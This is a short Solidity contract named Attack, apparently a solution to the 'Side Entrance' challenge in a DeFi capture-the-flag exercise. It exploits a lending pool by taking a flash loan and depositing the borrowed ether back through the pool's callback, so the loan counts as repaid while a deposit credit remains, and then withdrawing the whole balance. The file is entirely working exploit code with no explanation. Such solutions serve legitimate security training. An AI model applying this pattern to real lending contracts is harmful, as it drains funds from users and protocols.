// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

import "./SideEntranceLenderPool.sol";

/*
* @title: 
* @author: Anthony (fps) https://github.com/0xfps.
* @dev: 
*/
contract Attack {
    uint256 public bal;
    SideEntranceLenderPool public _s;
    
    fallback() external {}
    receive() external payable {}

    function initialize(address _pool) public {
        _s = SideEntranceLenderPool(_pool);
    }

    function balanceOf() public {
        bal = address(_s).balance;
    }

    function attack(uint256 amount) public {
        _s.flashLoan(amount);
    }

    function execute() external payable {
        _s.deposit{value: msg.value}();
    }

    function withdrawAll() public payable {
        _s.withdraw();
    }
}
